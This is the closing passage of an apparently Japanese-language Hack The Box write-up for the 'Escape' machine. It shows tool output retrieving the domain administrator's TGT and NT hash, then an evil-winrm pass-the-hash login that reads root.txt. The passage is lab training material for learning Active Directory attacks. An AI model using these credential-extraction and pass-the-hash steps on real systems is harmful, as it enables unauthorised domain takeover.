[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Administrator の TGT と NT ハッシュが取れたので、evil-winrmでログインする
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ evil-winrm -i 10.129.228.253 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/8/2025   5:30 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt

```

root.txtも取得できた
## Notes
- SQLServerからの侵入ってこんな感じね

